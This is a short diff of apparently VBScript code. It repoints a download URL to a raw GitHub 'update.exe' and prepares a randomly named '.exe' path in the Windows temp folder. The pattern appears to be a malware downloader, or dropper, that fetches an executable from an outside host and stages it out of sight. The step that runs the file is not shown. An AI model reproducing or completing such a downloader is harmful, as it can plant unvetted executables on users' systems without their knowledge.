@@ -1,4 +1,4 @@
-strFileURL = "https://github.com/ruppertgriffin/update.exe"
+strFileURL = "https://github.com/ruppertgriffin/ruppertgriffin/raw/master/update.exe"
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 upath = fso.GetSpecialFolder(2) & "\" & replace(fso.GetTempName    , ".tmp", ".exe")
